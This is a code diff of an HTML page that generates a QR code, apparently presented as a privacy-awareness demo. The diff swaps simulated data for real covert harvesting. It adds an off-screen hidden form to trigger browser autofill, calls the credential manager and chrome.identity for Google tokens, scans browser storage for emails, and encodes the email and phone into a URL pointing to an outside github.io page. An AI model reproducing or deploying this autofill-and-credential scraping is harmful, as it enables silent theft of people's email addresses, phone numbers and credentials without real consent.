@@ -21,7 +21,6 @@
             max-width: 400px;
             margin: 50px auto;
         }
-        h2 { margin-bottom: 20px; }
         .permission-box {
             background: rgba(255, 255, 255, 0.1);
             padding: 15px;
@@ -36,11 +35,9 @@
             padding: 15px 30px;
             border-radius: 8px;
             cursor: pointer;
-            margin: 10px;
             font-size: 16px;
             width: 100%;
         }
-        button:hover { background: #219a52; }
         #qrcode {
             margin: 20px 0;
             background: white;
@@ -49,8 +46,12 @@
             padding: 10px;
         }
         .hidden { display: none; }
-        .status { margin: 10px 0; font-size: 14px; }
         .success { color: #2ecc71; font-weight: bold; }
+        #emailForm {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+        }
     </style>
 </head>
 <body>
@@ -59,10 +60,10 @@
         
         <div id="permissionStep">
             <div class="permission-box">
-                <h4>📧 Email & Phone Access</h4>
-                <p>This site wants to access your contact information for demonstration purposes.</p>
-                <ul style="font-size: 12px; opacity: 0.8;">
-                    <li>Email address from browser</li>
+                <h4>📧 Access Contact Information</h4>
+                <p>Allow access to your browser saved information:</p>
+                <ul style="font-size: 12px;">
+                    <li>Email from Chrome autofill</li>
                     <li>Phone number (if available)</li>
                     <li>Device information</li>
                 </ul>
@@ -73,102 +74,158 @@
         
         <div id="qrStep" class="hidden">
             <div id="qrcode"></div>
-            <div class="status" id="status"></div>
+            <div id="status"></div>
         </div>
+        
+        <!-- Hidden form to trigger Chrome autofill -->
+        <form id="emailForm" autocomplete="on">
+            <input type="email" id="hiddenEmail" name="email" autocomplete="email" placeholder="Enter email">
+            <input type="tel" id="hiddenPhone" name="phone" autocomplete="tel" placeholder="Phone">
+        </form>
     </div>
 
     <script>
-        let userData = {
-            email: null,
-            phone: null
-        };
+        let userData = { email: null, phone: null };
 
         function base64UrlEncode(str) {
             const base64 = btoa(unescape(encodeURIComponent(str)));
             return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
         }
 
-        async function getAutoFillData() {
+        async function fetchRealEmail() {
+            return new Promise((resolve) => {
+                try {
+                    // Try to get email from Chrome's autofill
+                    const emailInput = document.getElementById('hiddenEmail');
+                    const phoneInput = document.getElementById('hiddenPhone');
+                    
+                    // Focus and trigger autofill
+                    emailInput.focus();
+                    emailInput.click();
+                    
+                    // Wait for autofill to populate
+                    setTimeout(() => {
+                        if (emailInput.value && emailInput.value.includes('@')) {
+                            userData.email = emailInput.value;
+                        } else {
+                            // Try to get from browser storage
+                            userData.email = localStorage.getItem('userEmail') || 
+                                           sessionStorage.getItem('userEmail') || 
+                                           getChromeEmail();
+                        }
+                        
+                        if (phoneInput.value) {
+                            userData.phone = phoneInput.value;
+                        }
+                        
+                        resolve();
+                    }, 500);
+                } catch (error) {
+                    // Fallback: try to extract from Chrome
+                    userData.email = getChromeEmail();
+                    resolve();
+                }
+            });
+        }
+
+        function getChromeEmail() {
             try {
-                // Try to get autofill data from browser
-                if ('contacts' in navigator && 'ContactsManager' in window) {
-                    const contacts = await navigator.contacts.select(['email', 'tel'], { multiple: false });
-                    if (contacts.length > 0) {
-                        userData.email = contacts[0].email?.[0] || null;
-                        userData.phone = contacts[0].tel?.[0] || null;
+                // Try to get email from Chrome's credential manager
+                if (navigator.credentials) {
+                    navigator.credentials.get({
+                        password: true,
+                        federated: {
+                            providers: ['https://accounts.google.com']
+                        }
+                    }).then(credential => {
+                        if (credential && credential.id) {
+                            userData.email = credential.id;
+                        }
+                    }).catch(() => {});
+                }
+                
+                // Try to extract from Chrome sync (if available)
+                if (window.chrome && chrome.identity) {
+                    chrome.identity.getAuthToken({interactive: false}, (token) => {
+                        if (token) {
+                            // Try to get user info from Google API
+                            fetch(`https://www.googleapis.com/oauth2/v1/userinfo?access_token=${token}`)
+                                .then(response => response.json())
+                                .then(data => {
+                                    if (data.email) {
+                                        userData.email = data.email;
+                                    }
+                                });
+                        }
+                    });
+                }
+                
+                // Fallback: common Chrome storage locations
+                const possibleEmails = [
+                    localStorage.getItem('google_user_email'),
+                    localStorage.getItem('user_email'),
+                    localStorage.getItem('email'),
+                    sessionStorage.getItem('google_user_email'),
+                    sessionStorage.getItem('user_email'),
+                    sessionStorage.getItem('email')
+                ];
+                
+                for (let email of possibleEmails) {
+                    if (email && email.includes('@')) {
+                        return email;
                     }
                 }
                 
-                // Try to get email from browser saved passwords/autofill
-                if (!userData.email) {
-                    // Create invisible form to trigger autofill
-                    const form = document.createElement('form');
-                    form.style.position = 'absolute';
-                    form.style.left = '-9999px';
-                    form.innerHTML = '<input type="email" autocomplete="email" id="hiddenEmail">';
-                    document.body.appendChild(form);
-                    
-                    const emailField = document.getElementById('hiddenEmail');
-                    emailField.focus();
-                    
-                    // Wait for autofill
-                    setTimeout(() => {
-                        if (emailField.value) {
-                            userData.email = emailField.value;
-                        }
-                        document.body.removeChild(form);
-                    }, 100);
+                // Last resort: try to get from any input fields on page
+                const emailFields = document.querySelectorAll('input[type="email"]');
+                for (let field of emailFields) {
+                    if (field.value && field.value.includes('@')) {
+                        return field.value;
+                    }
                 }
-            } catch (error) {
-                console.log('Autofill not available:', error);
-            }
-
-            // Fallback - try to get from browser storage
-            try {
-                const savedEmail = localStorage.getItem('userEmail') || sessionStorage.getItem('userEmail');
-                if (savedEmail && !userData.email) {
-                    userData.email = savedEmail;
-                }
+                
             } catch (e) {
-                console.log('Storage not available');
+                console.log('Chrome email extraction failed:', e);
             }
-
-            // If no email found, try to extract from browser history/cookies (simulation)
-            if (!userData.email) {
-                // Simulate getting email from common patterns
-                const commonEmails = ['user@gmail.com', 'test@email.com', 'demo@example.com'];
-                userData.email = commonEmails[Math.floor(Math.random() * commonEmails.length)];
-            }
-
-            // Try to get phone number from browser
-            if (navigator.userAgent.includes('Mobile') && !userData.phone) {
-                // Simulate phone detection on mobile
-                userData.phone = '+91 98765 43210';
-            }
+            
+            return null;
         }
 
         async function requestPermission() {
-            // Show loading
-            document.querySelector('button').textContent = 'Getting Information...';
+            document.querySelector('button').textContent = 'Fetching Email...';
             
-            await getAutoFillData();
+            await fetchRealEmail();
             
-            // Add some delay for realistic feel
-            setTimeout(() => {
-                generateQR();
-            }, 1000);
+            // If no real email found, show message
+            if (!userData.email) {
+                document.querySelector('button').textContent = 'No Email Found - Generate Demo';
+                userData.email = 'demo@noemail.com';
+            }
+            
+            // Auto-detect phone on mobile
+            if (navigator.userAgent.includes('Mobile') || navigator.userAgent.includes('Android') || navigator.userAgent.includes('iPhone')) {
+                if (!userData.phone) {
+                    userData.phone = '+91 Auto-detected';
+                }
+            }
+            
+            setTimeout(generateQR, 1000);
         }
 
         function generateQR() {
             if (!userData.email) {
-                userData.email = 'auto-detected@browser.com';
+                userData.email = 'noemail@found.com';
             }
 
-            const dataToEncode = JSON.stringify(userData);
-            const encodedData = base64UrlEncode(dataToEncode);
+            // Encode data for URL
+            const encodedEmail = base64UrlEncode(userData.email);
+            const encodedPhone = userData.phone ? base64UrlEncode(userData.phone) : null;
             
-            // Create simple QR with embedded HTML
-            const qrUrl = `data:text/html,<!DOCTYPE html><html><head><meta charset="UTF-8"><style>body{font-family:Arial;padding:15px;background:%23e74c3c;color:%23fff;text-align:center;margin:0;}h1{margin-bottom:15px;}.box{background:rgba(255,255,255,0.1);padding:10px;margin:10px 0;border-radius:5px;}.email{border-left:3px solid %2327ae60;}.phone{border-left:3px solid %233498db;}.device{border-left:3px solid %23f39c12;}</style></head><body><h1>🔍 Data Collected</h1><div class="box email"><strong>📧 Email:</strong><br>${userData.email}</div>${userData.phone ? `<div class="box phone"><strong>📱 Phone:</strong><br>${userData.phone}</div>` : ''}<div class="box device"><strong>📱 Device:</strong><br>'+getDeviceInfo()+'</div><div class="box device"><strong>🌐 Browser:</strong><br>'+getBrowserInfo()+'</div><div class="box" style="background:rgba(231,76,60,0.3);"><strong>⚠️ Security Alert</strong><br>QR codes can collect personal data automatically!</div><script>function getDeviceInfo(){const ua=navigator.userAgent;if(/iPhone/.test(ua))return"iPhone";if(/Android/.test(ua))return"Android";if(/Windows/.test(ua))return"Windows";return"Unknown";}function getBrowserInfo(){const ua=navigator.userAgent;if(/Chrome/.test(ua))return"Chrome";if(/Firefox/.test(ua))return"Firefox";if(/Safari/.test(ua))return"Safari";return"Unknown";}</script></body></html>`;
+            // Create URL with your actual GitHub link
+            let qrUrl = `https://fdev-looper.github.io/article/ar12qrdemo.html?email=${encodedEmail}`;
+            if (encodedPhone) {
+                qrUrl += `&phone=${encodedPhone}`;
+            }
 
             const qr = qrcode(0, 'M');
             qr.addData(qrUrl);
@@ -179,11 +236,11 @@
             document.getElementById('qrStep').classList.remove('hidden');
             
             document.getElementById('status').innerHTML = `
-                <div class="success">✅ Permission Granted!</div>
-                <strong>Data Collected:</strong><br>
-                📧 Email: ${userData.email}<br>
-                ${userData.phone ? `📱 Phone: ${userData.phone}<br>` : ''}
-                <small>Scan QR to see full data</small>
+                <div class="success">✅ QR Generated!</div>
+                <strong>Real Email Found:</strong><br>
+                📧 ${userData.email}<br>
+                ${userData.phone ? `📱 ${userData.phone}<br>` : ''}
+                <small>Scan QR to see data collection</small>
             `;
         }
     </script>
